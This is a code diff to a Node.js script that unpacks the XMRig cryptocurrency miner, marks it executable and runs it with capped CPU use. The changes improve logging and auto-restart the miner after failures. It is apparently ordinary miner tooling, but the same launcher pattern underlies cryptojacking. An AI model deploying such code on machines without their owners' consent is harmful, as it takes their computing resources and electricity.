@@ -28,7 +28,7 @@ async function checkXmrig() {
 async function extractXmrig() {
   try {
     await tar.x({ file: minerTar });
-    fs.chmodSync(minerBinary, 0o755);
+    fs.chmodSync(minerBinary, 0o755);  // Set executable permissions
     console.log('[*] XMRig extracted and ready.');
   } catch (err) {
     console.error('[!] Failed to extract the archive:', err.message);
@@ -52,20 +52,29 @@ async function startMining() {
     '--donate-level', '1',
     '--cpu-priority', '5',
     '--max-cpu-usage', '75',
-    
   ], { stdio: ['ignore', 'pipe', 'pipe'] });
 
   xmrig.stdout.on('data', (data) => {
-    process.stdout.write(`xmrig: ${data}`);
+    console.log(`xmrig output: ${data.toString()}`);
   });
 
   xmrig.stderr.on('data', (data) => {
-    process.stderr.write(`xmrig error: ${data}`);
+    console.error(`xmrig error: ${data.toString()}`);
   });
 
-  xmrig.on('close', (code) => {
-    console.error(`[!] XMRig exited with code ${code}. Restarting in 5 seconds...`);
-    setTimeout(startMining, 5000);
+  xmrig.on('close', (code, signal) => {
+    if (code === 0) {
+      console.log('[*] XMRig exited successfully.');
+    } else {
+      console.error(`[!] XMRig exited with code ${code} and signal ${signal}. Restarting in 5 seconds...`);
+      // Retry in case of non-zero exit code
+      setTimeout(() => startMining(), 5000);
+    }
+  });
+
+  xmrig.on('error', (err) => {
+    console.error(`[!] Failed to start XMRig: ${err.message}`);
+    process.exit(1);
   });
 }
 
